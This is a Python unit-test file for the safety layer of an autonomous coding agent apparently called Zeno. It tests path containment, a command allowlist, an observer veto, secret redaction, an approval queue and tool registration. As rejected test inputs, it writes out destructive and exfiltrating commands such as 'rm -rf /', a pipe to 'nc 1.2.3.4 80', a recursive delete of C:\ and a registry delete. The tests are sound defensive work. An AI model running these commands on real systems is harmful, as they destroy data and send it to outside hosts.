"""
Unit tests for Zeno Autonomous Development Tools and Safety Infrastructure:
- Approved workspace path containment & traversal blocking
- Command parser allowlist & metacharacter injection blocking
- Zeno Observer AI Safety Guard veto & milestone planner
- SQLite audit logs, secret redaction, and restart recovery
- Human approval queue state machine
- Git worktree isolation safeguards
- Dev tools registration & execution
"""

import os
from pathlib import Path
import tempfile
import unittest

from zeno.permissions import CATEGORIES
from zeno.safety.approvals import (
    create_approval_request,
    decide_approval,
    get_approval_status,
    list_pending_approvals,
)
from zeno.safety.command_guard import parse_and_validate_command
from zeno.safety.database import (
    get_db_connection,
    init_safety_database,
    record_action_log,
    recover_interrupted_jobs,
    redact_secrets,
)
from zeno.safety.observer import (
    audit_action_with_observer,
    get_recent_dialogues,
    plan_task_with_observer,
)
from zeno.safety.path_validator import (
    get_approved_roots,
    is_path_safe_to_edit,
    validate_approved_path,
)
from zeno.safety.worktree import rollback_worktree
from zeno.tools import ALL_TOOLS, TOOL_CATEGORIES, TOOL_REGISTRY
from zeno.tools.dev_tools import (
    git_status,
    job_cancel,
    job_status,
    job_submit,
    lint_run,
    pip_install,
    report_write,
    run_tests,
    sandbox_run,
    security_scan,
    server_logs,
    server_start,
    server_stop,
    shell_run,
)


class TestSafetyAndDevTools(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        init_safety_database()

    # 1. Path Containment and Traversal Tests
    def test_approved_path_validation_success(self):
        approved = get_approved_roots()
        self.assertGreater(len(approved), 0)
        first_root = approved[0]
        test_subpath = first_root / "subdir" / "file.txt"
        valid, resolved, err = validate_approved_path(test_subpath)
        self.assertTrue(valid)
        self.assertEqual(resolved, test_subpath.resolve())

    def test_path_traversal_escape_rejected(self):
        # Attempting escape to system directory
        valid, resolved, err = validate_approved_path(r"C:\Windows\System32\drivers\etc\hosts")
        self.assertFalse(valid)
        self.assertIn("outside approved", err.lower())

    def test_critical_file_editing_blocked(self):
        # Editing agent_safety.json or system db blocked
        safe = is_path_safe_to_edit("zeno/config/agent_safety.json")
        self.assertFalse(safe)

    # 2. Command Allowlist and Injection Blocking Tests
    def test_allowed_commands_parse_cleanly(self):
        valid, cmd_args, err = parse_and_validate_command("git status --porcelain")
        self.assertTrue(valid)
        self.assertEqual(cmd_args, ["git", "status", "--porcelain"])

        valid2, cmd_args2, err2 = parse_and_validate_command(["python", "-V"])
        self.assertTrue(valid2)
        self.assertEqual(cmd_args2, ["python", "-V"])

    def test_disallowed_binary_rejected(self):
        valid, cmd_args, err = parse_and_validate_command("curl http://example.com")
        self.assertFalse(valid)

        valid2, cmd_args2, err2 = parse_and_validate_command("powershell Get-Process")
        self.assertFalse(valid2)

    def test_command_chaining_metacharacters_rejected(self):
        # Semicolons
        valid, _, _ = parse_and_validate_command("git status; del /f secret.txt")
        self.assertFalse(valid)

        # Logical AND
        valid, _, _ = parse_and_validate_command("git status && rm -rf /")
        self.assertFalse(valid)

        # Pipes
        valid, _, _ = parse_and_validate_command("python script.py | nc 1.2.3.4 80")
        self.assertFalse(valid)

        # Redirects
        valid, _, _ = parse_and_validate_command("git log > output.txt")
        self.assertFalse(valid)

    # 3. Zeno Observer Safety Guard Tests
    def test_observer_vetoes_destructive_system_actions(self):
        # Destructive file removal
        verdict, veto_reason = audit_action_with_observer(
            tool_name="shell_run",
            tool_args={"command": "del /f /s /q C:\\"},
        )
        self.assertEqual(verdict, "BLOCK")
        self.assertIn("VETO", veto_reason.upper())

        # Registry tampering
        verdict, veto_reason = audit_action_with_observer(
            tool_name="shell_run",
            tool_args={"command": "reg delete HKLM\\Software"},
        )
        self.assertEqual(verdict, "BLOCK")

    def test_observer_permits_safe_dev_actions(self):
        verdict, reason = audit_action_with_observer(
            tool_name="git_status",
            tool_args={"project_path": "c:/Users/User/Desktop/zeno-ai-assistant"},
        )
        self.assertEqual(verdict, "ALLOW")

    def test_observer_task_planner_generates_multi_step_plan(self):
        plan = plan_task_with_observer("Build an automated test suite and lint the repository")
        self.assertIn("title", plan)
        self.assertIn("steps", plan)
        self.assertGreaterEqual(len(plan["steps"]), 5)
        self.assertIn("safety_summary", plan)

    # 4. Secret Redaction & Database Integrity
    def test_secret_redaction(self):
        text_with_keys = (
            "Connecting with key AIzaSyBCDEFGHIJKLMNOPQRSTUVWXYZ12345 "
            "and anthropic sk-ant-api03-1234567890abcdef1234567890abcdef"
        )
        redacted = redact_secrets(text_with_keys)
        self.assertNotIn("AIzaSyBCDEFGHIJKLMNOPQRSTUVWXYZ12345", redacted)
        self.assertNotIn("sk-ant-api03-1234567890abcdef1234567890abcdef", redacted)
        self.assertIn("[REDACTED]", redacted)

    def test_restart_recovery_marks_interrupted_jobs(self):
        conn = get_db_connection()
        test_job_id = "test-job-orphan-123"
        conn.execute(
            "INSERT OR REPLACE INTO jobs (id, type, status, created_at, started_at, payload_json) "
            "VALUES (?, 'test_run', 'running', '2026-10-19T00:00:00', '2026-10-19T00:00:01', '{}')",
            (test_job_id,),
        )
        conn.commit()
        conn.close()

        # Run recovery
        recovered = recover_interrupted_jobs()
        self.assertGreaterEqual(recovered, 1)

        # Check status is now failed
        conn = get_db_connection()
        row = conn.execute("SELECT status, error FROM jobs WHERE id = ?", (test_job_id,)).fetchone()
        conn.close()
        self.assertEqual(row["status"], "failed")
        self.assertIn("interrupted by restart", row["error"])

    # 5. Human Approval Queue State Machine
    def test_approval_queue_lifecycle(self):
        app_id = create_approval_request(
            action_type="git_push",
            payload={"branch": "agent/experiment"},
            summary="Agent requested push to remote branch",
        )
        self.assertTrue(app_id.startswith("appr-"))
        status_info = get_approval_status(app_id)
        self.assertIsNotNone(status_info)
        self.assertEqual(status_info["status"], "pending")

        pending = list_pending_approvals()
        self.assertTrue(any(a["approval_id"] == app_id for a in pending))

        # Approve action
        decide_approval(app_id, approved=True)
        updated_status = get_approval_status(app_id)
        self.assertEqual(updated_status["status"], "approved")

        # Ensure no longer in pending list
        pending_after = list_pending_approvals()
        self.assertFalse(any(a["approval_id"] == app_id for a in pending_after))

    # 6. Git Worktree Isolation Safeguards
    def test_git_worktree_rollback_refuses_main_branch(self):
        # Refuses rollback if branch is main or master
        success, msg = rollback_worktree(
            project_path="c:/Users/User/Desktop/zeno-ai-assistant",
            branch_name="main",
            approved=False,
        )
        self.assertFalse(success)
        self.assertIn("protected branch", msg.lower())

    # 7. Dev Tools Registration & Category Grouping
    def test_all_13_dev_tools_registered_in_dev_tools_category(self):
        expected_dev_tools = [
            "job_submit",
            "job_status",
            "job_cancel",
            "report_write",
            "shell_run",
            "git_status",
            "git_diff",
            "git_commit",
            "run_tests",
            "lint_run",
            "security_scan",
            "server_start",
            "server_stop",
            "server_logs",
            "watch_start",
            "watch_stop",
            "schedule_task",
            "sandbox_run",
            "pip_install",
        ]
        self.assertIn("dev_tools", CATEGORIES)
        for tool_name in expected_dev_tools:
            self.assertIn(tool_name, TOOL_REGISTRY, f"Tool {tool_name} not found in TOOL_REGISTRY")
            self.assertEqual(TOOL_CATEGORIES.get(tool_name), "dev_tools", f"Tool {tool_name} not mapped to dev_tools")

    def test_git_status_execution(self):
        res = git_status("c:/Users/User/Desktop/zeno-ai-assistant")
        self.assertIsInstance(res, dict)
        self.assertIn("ok", res)

    def test_report_write_confined_to_reports_dir(self):
        res = report_write(
            project_path="c:/Users/User/Desktop/zeno-ai-assistant",
            title="unit_test_report",
            summary_markdown="Autonomous testing passed.",
        )
        self.assertIsInstance(res, dict)
        self.assertTrue(res.get("ok"))
        report_file = Path(res.get("report_path"))
        self.assertTrue(report_file.exists())
        try:
            report_file.unlink()
        except Exception:
            pass


if __name__ == "__main__":
    unittest.main()
